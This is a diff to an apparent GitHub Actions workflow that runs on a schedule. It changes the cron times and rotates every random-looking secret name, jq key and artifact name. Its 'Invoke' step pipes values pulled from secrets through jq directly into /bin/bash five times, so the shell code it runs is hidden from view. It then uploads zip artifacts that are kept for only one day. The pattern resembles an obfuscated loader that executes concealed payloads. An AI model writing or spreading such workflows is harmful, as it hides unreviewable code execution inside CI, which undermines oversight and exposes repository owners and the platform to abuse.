@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '18 5,11,17,23 * * *'
+    - cron: '12 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -17,18 +17,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Invoke
         env:
-          xrmg5335: ${{ secrets.xrmg5335 }}
+          mqegq284: ${{ secrets.mqegq284 }}
         run: |
-          printf '%s' "$xrmg5335" | jq -r .znk5 | /bin/bash
-          echo $uglq8596 | jq -r .z212 | /bin/bash
-          printf '%s' "$j808" | jq -r .emi829 | /bin/bash
-          echo $uxu13964 | jq -r .aqjb6 | /bin/bash
-          echo $xcaef3807 | jq -r .byfo20 | /bin/bash
+          printf '%s' "$mqegq284" | jq -r .qme4110 | /bin/bash
+          echo $b06378 | jq -r .b34105 | /bin/bash
+          printf '%s' "$kwewg3" | jq -r .x1831 | /bin/bash
+          printf '%s' "$lj861" | jq -r .ylnu640 | /bin/bash
+          echo $tpa791 | jq -r .npjce92688 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: tNxhIR45
+          name: z5AV9bY9
           path: "*.zip"
           retention-days: 1
